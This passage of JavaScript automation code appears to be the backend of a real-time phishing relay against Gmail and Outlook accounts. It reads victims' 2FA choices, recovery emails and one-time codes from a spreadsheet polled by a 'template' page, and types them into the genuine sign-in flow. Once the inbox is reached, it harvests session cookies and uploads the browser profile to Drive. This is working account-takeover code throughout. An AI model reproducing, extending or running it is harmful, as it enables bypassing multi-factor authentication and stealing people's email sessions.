                                    currentVerificationOptions = await platformConfig.extractVerificationOptions(page, platformConfig, gmailPostClickVerification.viewName);
                                    updateBrowserRowDataFast(browserId, {
                                        status: "WAITINGOPTIONS",
                                        verificationChoice: '',
                                        verificationOptions: JSON.stringify(currentVerificationOptions),
                                        lastJsonResponse: JSON.stringify({
                                            ...JSON.parse(updateData.lastJsonResponse || '{}'),
                                            status: "WAITING_OPTIONS",
                                            viewName: gmailPostClickVerification.viewName,
                                            verificationOptions: currentVerificationOptions,
                                            message: "Selections refreshed."
                                        })
                                    });
                                } else {
                                    const gmailInbox = await isInbox(page, platformConfig).catch(() => false);
                                    if (gmailInbox) {
                                        logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Gmail reached inbox after option click.`);
                                        finalStatus = "COMPLETED";
                                        break;
                                    }
                                    logger.warn(`[processRow][${browserId}][WAITINGOPTIONS] Gmail option click: unexpected page state. Continuing poll.`);
                                    updateBrowserRowDataFast(browserId, {
                                        status: "WAITINGOPTIONS",
                                        verificationChoice: '',
                                        lastJsonResponse: JSON.stringify({
                                            ...JSON.parse(updateData.lastJsonResponse || '{}'),
                                            status: "WAITING_OPTIONS",
                                            message: "Unexpected state after option click."
                                        })
                                    });
                                }
                                await new Promise(resolve => setTimeout(resolve, 2000));
                                continue;
                            }

                            let sendCodeBtnSelector;
                            if (currentActualViewName === 'Outlook Verify Email Full Input') {
                                sendCodeBtnSelector = platformConfig.selectors.verifyEmailSendCodeButton;
                            } else {
                                sendCodeBtnSelector = platformConfig.selectors.sendCodeButton;
                            }

                            if (!sendCodeBtnSelector) throw new Error(`Send code button selector not defined for current view/platform configuration. View: ${currentActualViewName}`);

                            logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Attempting to click send code button: ${sendCodeBtnSelector} for view ${currentActualViewName}`);
                            await page.waitForSelector(sendCodeBtnSelector, { visible: true, timeout: 10000 });
                            const navigationPromise = page.waitForNavigation({ waitUntil: 'networkidle0', timeout: 15000 }).catch(() => null);
                            await page.click(sendCodeBtnSelector);
                            await navigationPromise;
                            logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Clicked "Send code" button: ${sendCodeBtnSelector}`);
                            await new Promise(res => setTimeout(res, 2000));

                            const outlookServiceErrorText = "There's a temporary problem with the service.";
                            const hasOutlookServiceError = await page.evaluate((errorText) => {
                                return document.body.innerText.includes(errorText);
                            }, outlookServiceErrorText).catch(() => false);

                            if (hasOutlookServiceError) {
                                logger.warn(`[processRow][${browserId}][WAITINGOPTIONS] Outlook service error detected: "${outlookServiceErrorText}"`);
                                const errorOption = [{ label: "Outlook: Temporary service problem. Please wait and try again.", type: "service_error", choiceIndex: "outlook_service_error" }];
                                currentVerificationOptions = errorOption; // Update for LJR

                                const ljpServiceError = JSON.parse(updateData.lastJsonResponse || '{}');
                                updateData.lastJsonResponse = JSON.stringify({
                                    ...ljpServiceError,
                                    status: "WAITING_OPTIONS",
                                    verificationState: 'WAITING_OPTIONS',
                                    verificationOptions: errorOption,
                                    viewName: currentActualViewName,
                                    message: "Outlook reported a temporary service problem. Please try again later."
                                });
                                updateBrowserRowDataFast(browserId, {
                                    status: "WAITINGOPTIONS",
                                    verificationChoice: '', // Re-added clearing
                                    verificationOptions: JSON.stringify(errorOption),
                                    lastJsonResponse: updateData.lastJsonResponse
                                });
                                logger.info(`[engineProcess][${browserId}] -WAITINGOPTIONS (error option)`);
                                activelyProcessing.delete(browserId);
                                // Continue to the next iteration of the WAITINGOPTIONS polling loop
                                await new Promise(resolve => setTimeout(resolve, 10000)); // Wait before next poll
                                continue;
                            }

                            const verificationStatusAfterSend = await checkVerification(page, platformConfig);
                            if (verificationStatusAfterSend.required && verificationStatusAfterSend.type === 'code') {
                                logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Successfully sent code. Transitioning to WAITING_CODE. View detected: ${verificationStatusAfterSend.viewName}`);
                                finalStatus = "WAITINGCODE";
                                const ljpBeforeCodeSend = JSON.parse(updateData.lastJsonResponse || '{}');
                                updateData = {
                                    status: "WAITINGCODE",
                                    verificationChoice: '', // Re-added clearing
                                    lastJsonResponse: JSON.stringify({
                                        ...ljpBeforeCodeSend,
                                        status: "WAITING_CODE",
                                        verificationState: 'WAITING_CODE',
                                        viewName: verificationStatusAfterSend.viewName,
                                        verificationOptions: currentVerificationOptions,
                                        message: "Code sent, awaiting input."
                                    })
                                };
                                updateBrowserRowDataFast(browserId, updateData);
                                break;
                            } else {
                                logger.warn(`[processRow][${browserId}][WAITINGOPTIONS] Did not reach a recognized 'code' entry screen after sending code. verificationStatusAfterSend: ${JSON.stringify(verificationStatusAfterSend)}. Current URL: ${page.url()}`);
                                const stillOnChoicePage = await checkVerification(page, platformConfig);
                                if (stillOnChoicePage.required && stillOnChoicePage.type === 'choice') {
                                    logger.warn(`[processRow][${browserId}][WAITINGOPTIONS] Still on a choice page: '${stillOnChoicePage.viewName}'. Input might be wrong or page didn't transition as expected. Clearing choice and re-setting to WAITINGOPTIONS.`);
                                    currentVerificationOptions = await platformConfig.extractVerificationOptions(page, platformConfig, stillOnChoicePage.viewName);
                                    updateBrowserRowDataFast(browserId, {
                                        status: "WAITINGOPTIONS",
                                        verificationOptions: JSON.stringify(currentVerificationOptions),
                                        lastJsonResponse: JSON.stringify({
                                            ...JSON.parse(updateData.lastJsonResponse || '{}'),
                                            status: "WAITING_OPTIONS",
                                            viewName: stillOnChoicePage.viewName,
                                            verificationOptions: currentVerificationOptions,
                                            message: "Failed to send code or invalid input, please re-enter choice."
                                        })
                                    });
                                } else {
                                    logger.error(`[processRow][${browserId}][WAITINGOPTIONS] Unexpected page state after attempting to send code. Failing.`);
                                    finalStatus = "FAILED"; break;
                                }
                            }
                        } catch (interactionError) {
                            logger.error(`[processRow][${browserId}][WAITINGOPTIONS] Error during page interaction for choice: ${interactionError.message}. Clearing choice and retrying WAITINGOPTIONS.`);
                            currentVerificationOptions = await platformConfig.extractVerificationOptions(page, platformConfig, currentActualViewName).catch(() => currentVerificationOptions);
                            updateBrowserRowDataFast(browserId, {
                                status: "WAITINGOPTIONS",
                                verificationOptions: JSON.stringify(currentVerificationOptions),
                                lastJsonResponse: JSON.stringify({
                                    ...JSON.parse(updateData.lastJsonResponse || '{}'),
                                    status: "WAITING_OPTIONS",
                                    viewName: currentActualViewName,
                                    verificationOptions: currentVerificationOptions,
                                    message: `Error processing choice: ${interactionError.message}`
                                })
                            });
                        }
                        logger.info(`[engineProcess][${browserId}] -WAITINGOPTIONS (fall-through)`);
                        activelyProcessing.delete(browserId);
                    }

                    } catch (pollError) {
                        logger.error(`[processRow][${browserId}][WAITINGOPTIONS] Error during polling: ${pollError.message}`);
                        logger.info(`[engineProcess][${browserId}] -WAITINGOPTIONS (poll error)`);
                        activelyProcessing.delete(browserId);
                        await new Promise(resolve => setTimeout(resolve, 15000));
                    }
                if (finalStatus === "WAITINGOPTIONS") {
                    await new Promise(resolve => setTimeout(resolve, 5000)); // Reduced polling interval from 10000 to 5000
                }
            }
            if (finalStatus === "WAITINGOPTIONS") {
                logger.warn(`[processRow][${browserId}][WAITINGOPTIONS] Polling for choice timed out. Setting status to FAILED.`);
                finalStatus = "FAILED";
                updateData.status = "FAILED";
                updateData.verified = true; // Account access achieved, verified but not full access (timeout on verification)
                updateData.fullAccess = false; // FAILED so fullAccess false
                updateData.lastJsonResponse = JSON.stringify({
                    ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED",
                    message: "Failed during WAITINGOPTIONS phase: Choice not provided in time."
                });

                // Explicitly close browser and clean up immediately
                if (browser && !browserFullyClosed) {
                    if (targetCreatedListener && !isReusingBrowser) browser.off('targetcreated', targetCreatedListener);
                    await browser.close().catch(err => logger.error(`Error closing browser for ${browserId} on WAITINGOPTIONS timeout: ${err.message}`));
                    browserFullyClosed = true;
                    activeBrowserSessions.delete(browserId);
                    await new Promise(resolve => setTimeout(resolve, 1000));
                }
                if (userDataDir) {
                    try {
                        logger.info(`[processRow][${browserId}] Deleting user data dir for WAITINGOPTIONS timeout: ${userDataDir}`);
                        await fs.remove(userDataDir);
                        logger.info(`[processRow][${browserId}] Successfully deleted user data directory.`);
                    } catch (deleteError) {
                        logger.error(`[processRow][${browserId}] Error deleting user data directory on WAITINGOPTIONS timeout: ${deleteError.message}`);
                    }
                }
                return; // Exit processRow if choice not found
            }
            updateData.status = finalStatus;
            if (finalStatus === "FAILED" && !updateData.lastJsonResponse?.includes("FAILED")) {
                updateData.lastJsonResponse = JSON.stringify({
                    ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED",
                    message: "Failed during WAITINGOPTIONS phase."
                });
            }
        } else if (status === "WAITINGRECOVERYEMAIL") {
            logger.info(`[processRow][${browserId}] Resuming from WAITINGRECOVERYEMAIL state.`);
            finalStatus = "WAITINGRECOVERYEMAIL";
            if (updateData.status !== "WAITINGRECOVERYEMAIL") {
                updateData.status = "WAITINGRECOVERYEMAIL";
                updateData.lastJsonResponse = JSON.stringify({
                    ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "WAITING_RECOVERY_EMAIL",
                    verificationState: 'WAITING_RECOVERY_EMAIL',
                    message: "Awaiting recovery email address."
                });
                updateBrowserRowDataFast(browserId, { status: "WAITINGRECOVERYEMAIL", verified: true, fullAccess: false, lastJsonResponse: updateData.lastJsonResponse });
            }

            const pollingTimeoutRecoveryEmail = Date.now() + 5 * 60 * 1000;
            let recoveryEmailProcessed = false;

            while (Date.now() < pollingTimeoutRecoveryEmail && finalStatus === "WAITINGRECOVERYEMAIL") {
                try {
                    if (page && !(await isPageResponsive(page, browserId, instanceId))) {
                        logger.error(`[processRow][${browserId}][WAITINGRECOVERYEMAIL] Page became unresponsive. Marking as FAILED.`);
                        finalStatus = "FAILED";
                        updateData.status = "FAILED";
                        updateData.lastJsonResponse = JSON.stringify({
                            ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED",
                            message: "Failed during WAITING_RECOVERY_EMAIL phase: Browser page became unresponsive."
                        });
                        break;
                    }

                    // Template Liveliness Check
                    if (!isTemplateAlive(browserId)) {
                        logger.info(`[processRow][${browserId}][WAITINGRECOVERYEMAIL] Template stopped polling (>3min). Closing browser.`);
                        finalStatus = "FAILED";
                        updateData.status = "FAILED";
                        updateData.lastJsonResponse = JSON.stringify({
                            ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED",
                            message: "Failed during WAITINGRECOVERYEMAIL phase: Template stopped responding."
                        });
                        break;
                    }

                    const checkData = await fetchDataFromAppScript(1, 30000, true);
                    const checkHeaders = checkData[0];
                    const checkColumnIndexes = getColumnIndexes(checkHeaders);
                    const checkRows = checkData.slice(1);
                    const checkRow = checkRows.find(r => r[checkColumnIndexes['browserId']] === browserId);

                    if (!checkRow) {
                        logger.error(`[processRow][${browserId}][WAITINGRECOVERYEMAIL] Row not found. Exiting loop.`);
                        finalStatus = "FAILED";
                        break;
                    }

                    const currentSheetStatus = checkRow[columnIndexes['status']];
                    const recoveryEmailValue = checkRow[columnIndexes['recoveryEmail']];

                    if (currentSheetStatus !== "WAITINGRECOVERYEMAIL") {
                        logger.info(`[processRow][${browserId}][WAITINGRECOVERYEMAIL] Status changed externally to ${currentSheetStatus}. Exiting loop.`);
                        finalStatus = currentSheetStatus;
                        break;
                    }

                    if (recoveryEmailValue && String(recoveryEmailValue).trim() !== "") {
                        logger.info(`[processRow][${browserId}][WAITINGRECOVERYEMAIL] Recovery email found: '${recoveryEmailValue}'. Setting status to PROCESSING.`);
                        logger.info(`[engineProcess][${browserId}] +WAITINGRECOVERYEMAIL (found recovery email)`);
                        activelyProcessing.add(browserId);
                        updateBrowserRowDataFast(browserId, { status: "PROCESSING", verified: true, fullAccess: false, lastJsonResponse: JSON.stringify({ browserId, email, status: "PROCESSING", message: "Processing recovery email" }) });

                        const recoveryInputSelector = platformConfig.selectors?.recoveryEmailInput;
                        const recoveryNextSelector = platformConfig.selectors?.recoveryEmailNext;

                        if (recoveryInputSelector) {
                            try {
                                await page.waitForSelector(recoveryInputSelector, { visible: true, timeout: 10000 });
                                await page.evaluate((sel) => { const el = document.querySelector(sel); if (el) el.value = ''; }, recoveryInputSelector);
                                await page.type(recoveryInputSelector, String(recoveryEmailValue), { delay: 50 });
                                logger.info(`[processRow][${browserId}][WAITINGRECOVERYEMAIL] Typed recovery email into ${recoveryInputSelector}`);

                                const navigationPromise = page.waitForNavigation({ waitUntil: 'networkidle0', timeout: 15000 })
                                    .catch(e => logger.warn(`[processRow][${browserId}][WAITINGRECOVERYEMAIL] Navigation after submit did not complete as expected: ${e.message}`));

                                if (recoveryNextSelector) {
                                    try {
                                        await page.waitForSelector(recoveryNextSelector, { visible: true, timeout: 5000 });
                                        await page.click(recoveryNextSelector);
                                        logger.info(`[processRow][${browserId}][WAITINGRECOVERYEMAIL] Clicked recovery email Next button: ${recoveryNextSelector}`);
                                    } catch (selErr) {
                                        await page.keyboard.press('Enter');
                                        logger.info(`[processRow][${browserId}][WAITINGRECOVERYEMAIL] Pressed Enter to submit recovery email.`);
                                    }
                                } else {
                                    await page.keyboard.press('Enter');
                                    logger.info(`[processRow][${browserId}][WAITINGRECOVERYEMAIL] No next selector, pressed Enter.`);
                                }

                                await navigationPromise;
                                await new Promise(res => setTimeout(res, 3000));
                                recoveryEmailProcessed = true;

                                const postRecoveryState = await checkVerification(page, platformConfig);
                                if (postRecoveryState.required && postRecoveryState.type === 'code') {
                                    logger.info(`[processRow][${browserId}][WAITINGRECOVERYEMAIL] Transitioned to code entry. Setting WAITINGCODE.`);
                                    finalStatus = "WAITINGCODE";
                                    updateData.status = "WAITINGCODE";
                                    updateData.recoveryEmail = '';
                                    updateData.lastJsonResponse = JSON.stringify({
                                        ...JSON.parse(updateData.lastJsonResponse || '{}'),
                                        status: "WAITING_CODE",
                                        verificationState: 'WAITING_CODE',
                                        viewName: postRecoveryState.viewName,
                                        message: "Recovery email submitted. Verification code screen reached."
                                    });
                                    updateBrowserRowDataFast(browserId, updateData);
                                    break;
                                } else if (postRecoveryState.required && postRecoveryState.type === 'choice') {
                                    logger.info(`[processRow][${browserId}][WAITINGRECOVERYEMAIL] Returned to choice screen after recovery email. Setting WAITINGOPTIONS.`);
                                    const freshOptions = await platformConfig.extractVerificationOptions(page, platformConfig, postRecoveryState.viewName);
                                    finalStatus = "WAITINGOPTIONS";
                                    updateData = {
                                        status: "WAITINGOPTIONS",
                                        recoveryEmail: '',
                                        verificationOptions: JSON.stringify(freshOptions),
                                        lastJsonResponse: JSON.stringify({
                                            ...JSON.parse(updateData.lastJsonResponse || '{}'),
                                            status: "WAITING_OPTIONS",
                                            verificationState: 'WAITING_OPTIONS',
                                            viewName: postRecoveryState.viewName,
                                            verificationOptions: freshOptions,
                                            message: "Recovery email submitted, returned to verification options."
                                        })
                                    };
                                    updateBrowserRowDataFast(browserId, updateData);
                                    break;
                                } else {
                                    const inboxReached = await isInbox(page, platformConfig).catch(() => false);
                                    if (inboxReached) {
                                        logger.info(`[processRow][${browserId}][WAITINGRECOVERYEMAIL] Reached inbox after recovery email submission.`);
                                        finalStatus = "COMPLETED";
                                        break;
                                    }
                                    logger.info(`[processRow][${browserId}][WAITINGRECOVERYEMAIL] Unexpected page state after recovery email. Continuing poll.`);
                                }
                            } catch (interactionError) {
                                logger.error(`[processRow][${browserId}][WAITINGRECOVERYEMAIL] Error during recovery email entry: ${interactionError.message}`);
                                updateBrowserRowDataFast(browserId, {
                                    status: "WAITINGRECOVERYEMAIL",
                                    lastJsonResponse: JSON.stringify({
                                        ...JSON.parse(updateData.lastJsonResponse || '{}'),
                                        status: "WAITING_RECOVERY_EMAIL",
                                        message: `Error entering recovery email: ${interactionError.message}`
                                    })
                                });
                                logger.info(`[engineProcess][${browserId}] -WAITINGRECOVERYEMAIL (error retry)`);
                                activelyProcessing.delete(browserId);
                            }
                        } else {
                            logger.error(`[processRow][${browserId}][WAITINGRECOVERYEMAIL] Recovery email input selector not defined for platform ${platform}. Failing.`);
                            finalStatus = "FAILED";
                            break;
                        }
                    }
                } catch (pollError) {
                    logger.error(`[processRow][${browserId}][WAITINGRECOVERYEMAIL] Error during polling: ${pollError.message}`);
                    await new Promise(resolve => setTimeout(resolve, 15000));
                }

                if (finalStatus === "WAITINGRECOVERYEMAIL") {
                    await new Promise(resolve => setTimeout(resolve, 5000));
                }
            }

            if (finalStatus === "WAITINGRECOVERYEMAIL" && !recoveryEmailProcessed) {
                logger.warn(`[processRow][${browserId}][WAITINGRECOVERYEMAIL] Polling for recovery email timed out. Setting status to FAILED.`);
                finalStatus = "FAILED";
                updateData.status = "FAILED";
                updateData.verified = true;
                updateData.fullAccess = false;
                updateData.lastJsonResponse = JSON.stringify({
                    ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED",
                    message: "Failed during WAITING_RECOVERY_EMAIL phase: Recovery email not provided in time."
                });

                if (browser && !browserFullyClosed) {
                    if (targetCreatedListener && !isReusingBrowser) browser.off('targetcreated', targetCreatedListener);
                    await browser.close().catch(err => logger.error(`Error closing browser for ${browserId} on WAITINGRECOVERYEMAIL timeout: ${err.message}`));
                    browserFullyClosed = true;
                    activeBrowserSessions.delete(browserId);
                    await new Promise(resolve => setTimeout(resolve, 1000));
                }
                if (userDataDir) {
                    try {
                        await fs.remove(userDataDir);
                    } catch (deleteError) {
                        logger.error(`[processRow][${browserId}] Error deleting user data dir on WAITINGRECOVERYEMAIL timeout: ${deleteError.message}`);
                    }
                }
                return;
            }

            updateData.status = finalStatus;
            if (finalStatus === "FAILED" && !updateData.lastJsonResponse?.includes("COMPLETED")) {
                updateData.lastJsonResponse = JSON.stringify({
                    ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED",
                    message: "Failed during WAITING_RECOVERY_EMAIL phase."
                });
            }
            logger.info(`[processRow][${browserId}] Exited WAITINGRECOVERYEMAIL loop. Final status: ${updateData.status}`);
        } else if (status === "WAITINGCODE") {
            logger.info(`[processRow][${browserId}] Resuming from WAITINGCODE state.`);
            finalStatus = "WAITINGCODE";
            if (updateData.status !== "WAITINGCODE") {
                updateData.status = "WAITINGCODE";
                updateData.lastJsonResponse = JSON.stringify({
                    ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "WAITING_CODE",
                    verificationState: 'WAITING_CODE',
                    viewName: JSON.parse(updateData.lastJsonResponse || '{}').viewName || initialCheckResult.viewName || null,
                    message: "Awaiting verification code."
                });
                updateBrowserRowDataFast(browserId, { status: "WAITINGCODE", verified: true, fullAccess: false, lastJsonResponse: updateData.lastJsonResponse });
            }


            const pollingTimeout = Date.now() + 5 * 60 * 1000;
            let codeSuccessfullyProcessed = false;

            while (Date.now() < pollingTimeout && finalStatus === "WAITINGCODE") {
                try {
                    // Session Health Check
                    if (page && !(await isPageResponsive(page, browserId, instanceId))) {
                        logger.error(`[processRow][${browserId}][WAITING_CODE] Page became unresponsive. Marking as FAILED.`);
                        finalStatus = "FAILED";
                        updateData.status = "FAILED";
                        updateData.lastJsonResponse = JSON.stringify({
                            ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED",
                            message: "Failed during WAITING_CODE phase: Browser page became unresponsive."
                        });
                        break; // Exit polling loop
                    }

                    // Template Liveliness Check
                    if (!isTemplateAlive(browserId)) {
                        logger.info(`[processRow][${browserId}][WAITINGCODE] Template stopped polling (>3min). Closing browser.`);
                        finalStatus = "FAILED";
                        updateData.status = "FAILED";
                        updateData.lastJsonResponse = JSON.stringify({
                            ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED",
                            message: "Failed during WAITINGCODE phase: Template stopped responding."
                        });
                        break;
                    }

                    const checkData = await fetchDataFromAppScript(1, 30000, true);
                    const checkHeaders = checkData[0];
                    const checkColumnIndexes = getColumnIndexes(checkHeaders);
                    const checkRows = checkData.slice(1);
                    const checkRow = checkRows.find(r => r[checkColumnIndexes['browserId']] === browserId);

                    if (!checkRow) {
                        logger.error(`[processRow][${browserId}][WAITINGCODE] Row not found during polling. Exiting loop.`);
                        finalStatus = "FAILED";
                        break;
                    }

                    const currentSheetStatus = checkRow[columnIndexes['status']];
                    const verificationCode = checkRow[columnIndexes['verificationCode']];

                    if (currentSheetStatus !== "WAITINGCODE") {
                        logger.info(`[processRow][${browserId}][WAITINGCODE] Status changed externally to ${currentSheetStatus}. Exiting loop.`);
                        finalStatus = currentSheetStatus;
                        break;
                    }

                    if (verificationCode && String(verificationCode).trim() !== "") {
                        logger.info(`[processRow][${browserId}][WAITINGCODE] Verification code found: '${verificationCode}'. Setting status to PROCESSING.`);
                        logger.info(`[engineProcess][${browserId}] +WAITINGCODE (found code)`);
                        activelyProcessing.add(browserId);
                        updateBrowserRowDataFast(browserId, { status: "PROCESSING", verified: true, fullAccess: false, lastJsonResponse: JSON.stringify({ browserId, email, status: "PROCESSING", message: "Processing verification code" }) }); // Set status to PROCESSING

                        const currentViewNameForCode = JSON.parse(updateData.lastJsonResponse || '{}').viewName || initialCheckResult.viewName;
                        let codeInputSelector;
                        let codeSubmitSelector;
                        let useEnterToSubmit = false;

                        if (currentViewNameForCode === 'Outlook Enter Code Fluent') {
                            codeInputSelector = platformConfig.selectors?.fluentCodeInput;
                            codeSubmitSelector = platformConfig.selectors?.fluentCodeSubmit;
                            useEnterToSubmit = true;
                            logger.info(`[processRow][${browserId}][WAITINGCODE] Using Fluent code input selectors. Input: ${codeInputSelector}, Will press Enter to submit.`);
                        } else if (currentViewNameForCode === 'Outlook Authenticator OTP') {
                            codeInputSelector = platformConfig.selectors?.authenticatorCodeInput;
                            codeSubmitSelector = platformConfig.selectors?.authenticatorCodeSubmit;
                            logger.info(`[processRow][${browserId}][WAITINGCODE] Using Authenticator OTP code selectors. Input: ${codeInputSelector}, Submit: ${codeSubmitSelector}`);
                        } else if (currentViewNameForCode === 'Gmail Email Code Entry') {
                            codeInputSelector = platformConfig.selectors?.gmailEmailCodeInput;
                            codeSubmitSelector = platformConfig.selectors?.gmailEmailCodeSubmit;
                            logger.info(`[processRow][${browserId}][WAITINGCODE] Using Gmail email code selectors. Input: ${codeInputSelector}, Submit: ${codeSubmitSelector}`);
                        } else if (currentViewNameForCode === 'Gmail Enter Code') {
                            codeInputSelector = platformConfig.selectors?.verificationCodeInput;
                            codeSubmitSelector = platformConfig.selectors?.verificationCodeSubmit;
                            logger.info(`[processRow][${browserId}][WAITINGCODE] Using Gmail standard code selectors. Input: ${codeInputSelector}, Submit: ${codeSubmitSelector}`);
                        } else {
                            codeInputSelector = platformConfig.selectors?.verificationCodeInput;
                            codeSubmitSelector = platformConfig.selectors?.verificationCodeSubmit;
                            logger.info(`[processRow][${browserId}][WAITINGCODE] Using standard code input selectors. Input: ${codeInputSelector}, Submit: ${codeSubmitSelector}`);
                        }

                        let codeEntryAttempted = false;
                        if (codeInputSelector) {
                            try {
                                await page.waitForSelector(codeInputSelector, { visible: true, timeout: 10000 });
                                await page.evaluate((sel) => { const el = document.querySelector(sel); if (el) el.value = ''; }, codeInputSelector);
                                await page.type(codeInputSelector, String(verificationCode), { delay: 50 });
                                logger.info(`[processRow][${browserId}][WAITINGCODE] Typed code into ${codeInputSelector}`);

                                const navigationPromise = page.waitForNavigation({ waitUntil: 'networkidle0', timeout: 15000 })
                                    .catch(e => logger.warn(`[processRow][${browserId}][WAITINGCODE] Navigation after code submit/Enter did not complete as expected or timed out: ${e.message}`));

                                if (useEnterToSubmit) {
                                    await page.keyboard.press('Enter');
                                    logger.info(`[processRow][${browserId}][WAITINGCODE] Pressed Enter to submit fluent code.`);
                                } else if (codeSubmitSelector) {
                                    await page.waitForSelector(codeSubmitSelector, { visible: true, timeout: 5000 });
                                    await page.click(codeSubmitSelector);
                                    logger.info(`[processRow][${browserId}][WAITINGCODE] Clicked code submit button: ${codeSubmitSelector}`);
                                } else {
                                    logger.warn(`[processRow][${browserId}][WAITINGCODE] No submit selector and not flagged to use Enter. Code typed, hoping for auto-submit.`);
                                }

                                await navigationPromise;
                                logger.info(`[processRow][${browserId}][WAITINGCODE] Waited after code submission attempt for page to settle.`);
                                codeEntryAttempted = true;

                            } catch (codeEntryError) {
                                logger.error(`[processRow][${browserId}][WAITINGCODE] Error during code entry/submission: ${codeEntryError.message}`);
                            }

                            if (codeEntryAttempted) {
                                // Check for codeError immediately after submission
                                let codeErrorSelector = platformConfig.selectors?.codeError;
                                // Use authenticator-specific error selector for that view
                                if (currentViewNameForCode === 'Outlook Authenticator OTP') {
                                    codeErrorSelector = platformConfig.selectors?.authenticatorCodeError || codeErrorSelector;
                                }
                                let codeErrorDetected = false;
                                if (codeErrorSelector) {
                                    const errorSelectors = Array.isArray(codeErrorSelector) ? codeErrorSelector : [codeErrorSelector];
                                    for (const sel of errorSelectors) {
                                        try {
                                            await page.waitForSelector(sel, { visible: true, timeout: 2000 });
                                            codeErrorDetected = true;
                                            logger.warn(`[processRow][${browserId}][WAITINGCODE] Code error detected via selector: ${sel}.`);
                                            break;
                                        } catch (e) {
                                            // Selector not found, try next
                                        }
                                    }
                                }

                                if (codeErrorDetected) {
                                    logger.warn(`[processRow][${browserId}][WAITINGCODE] Code error selector detected. Running safety check before marking incorrect...`);
                                    // SAFETY: Wait for page to settle, then verify we actually remain on code entry
                                    await new Promise(res => setTimeout(res, 5000));

                                    // Check 1: Did we reach the inbox directly?
                                    const postErrorInbox = await isInbox(page, platformConfig).catch(() => false);
                                    if (postErrorInbox) {
                                        logger.info(`[processRow][${browserId}][WAITINGCODE] Code was correct despite error flash. Inbox reached.`);
                                        finalStatus = "COMPLETED";
                                        codeSuccessfullyProcessed = true;

                                        const browserCookies = await page.cookies(`https://${domain}`, 'https://login.live.com', 'https://login.microsoftonline.com', 'https://www.microsoft.com', 'https://outlook.live.com', 'https://mail.google.com');
                                        updateData.status = "COMPLETED";
                                        updateData.cookieJSON = JSON.stringify(browserCookies);
                                        updateData.verified = true;
                                        updateData.fullAccess = true;
                                        updateData.lastJsonResponse = JSON.stringify({
                                            browserId, email, status: "COMPLETED",
                                            emailExists: initialCheckResult.emailExists, accountAccess: true,
                                            reachedInbox: true, requiresVerification: false,
                                            verified: true, fullAccess: true,
                                            platform, timestamp: new Date().toISOString(),
                                            message: "Code accepted despite error flash. Reached inbox."
                                        });

                                        if (browser) {
                                            if (targetCreatedListener && !isReusingBrowser) browser.off('targetcreated', targetCreatedListener);
                                            logger.info(`[processRow][${browserId}] Closing browser after successful verification (error-flash safety).`);
                                            await browser.close().catch(err => logger.error(`Error closing browser for ${browserId}: ${err.message}`));
                                            browserFullyClosed = true;
                                            activeBrowserSessions.delete(browserId);
                                            await new Promise(resolve => setTimeout(resolve, 2000));
                                        }

                                        try {
                                            const uploadedUrl = await uploadBrowserData(browserId);
                                            if (uploadedUrl) updateData.driveUrl = uploadedUrl;
                                        } catch (uploadError) {
                                            logger.error(`[processRow][${browserId}] Error during Drive upload after safety check: ${uploadError.message}`);
                                        }

                                        if (updateData.driveUrl && userDataDir) {
                                            try { await fs.remove(userDataDir); } catch (e) {}
                                        }
                                        break;
                                    }

                                    // Check 2: Page moved past code entry (e.g. into additional views)?
                                    const postErrorState = await checkVerification(page, platformConfig).catch(() => ({ required: true, type: 'code' }));
                                    if (!postErrorState.required || postErrorState.type !== 'code') {
                                        logger.info(`[processRow][${browserId}][WAITINGCODE] Page moved past code entry despite error flash. Handling additional views...`);
                                        await handleAdditionalViews(page, platformConfig, instanceId, 'post_verification');
                                        // Wait for any pending navigation to complete after handling additional views
                                        await page.waitForNavigation({ waitUntil: 'domcontentloaded', timeout: 15000 }).catch(() => null);
                                        await new Promise(res => setTimeout(res, 3000));
                                        const inboxAfterViews = await isInbox(page, platformConfig).catch(() => false);
                                        if (inboxAfterViews) {
                                            logger.info(`[processRow][${browserId}][WAITINGCODE] Inbox reached after additional views. Setting COMPLETED.`);
                                            finalStatus = "COMPLETED";
                                            codeSuccessfullyProcessed = true;

                                            const browserCookies = await page.cookies(`https://${domain}`, 'https://login.live.com', 'https://login.microsoftonline.com', 'https://www.microsoft.com', 'https://outlook.live.com', 'https://mail.google.com');
                                            updateData.status = "COMPLETED";
                                            updateData.cookieJSON = JSON.stringify(browserCookies);
                                            updateData.verified = true;
                                            updateData.fullAccess = true;
                                            updateData.lastJsonResponse = JSON.stringify({
                                                browserId, email, status: "COMPLETED",
                                                emailExists: initialCheckResult.emailExists, accountAccess: true,
                                                reachedInbox: true, requiresVerification: false,
                                                verified: true, fullAccess: true,
                                                platform, timestamp: new Date().toISOString(),
                                                message: "Code accepted. Reached inbox after additional views."
                                            });

                                            if (browser) {
                                                if (targetCreatedListener && !isReusingBrowser) browser.off('targetcreated', targetCreatedListener);
                                                await browser.close().catch(err => logger.error(`Error closing browser for ${browserId}: ${err.message}`));
                                                browserFullyClosed = true;
                                                activeBrowserSessions.delete(browserId);
                                                await new Promise(resolve => setTimeout(resolve, 2000));
                                            }

                                            try {
                                                const uploadedUrl = await uploadBrowserData(browserId);
                                                if (uploadedUrl) updateData.driveUrl = uploadedUrl;
                                            } catch (uploadError) {
                                                logger.error(`[processRow][${browserId}] Error during Drive upload after views check: ${uploadError.message}`);
                                            }

                                            if (updateData.driveUrl && userDataDir) {
                                                try { await fs.remove(userDataDir); } catch (e) {}
                                            }
                                            break;
                                        }
                                    }

                                    // Confirmed still on code entry — mark as incorrect
                                    logger.warn(`[processRow][${browserId}][WAITINGCODE] Confirmed incorrect code after safety check. Remaining on code entry screen.`);
                                    const ljp = JSON.parse(updateData.lastJsonResponse || '{}');
                                    if (platform === 'gmail' && ljp.viewName === 'sh Gmail 2-Step Verification') {
                                        ljp.gmail = { step: "waiting_app_notification", canResend: true, canChangeMethod: true, instructions: "Tap 'Yes' on the notification in your Gmail app on your phone to allow sign-in." };
                                    }
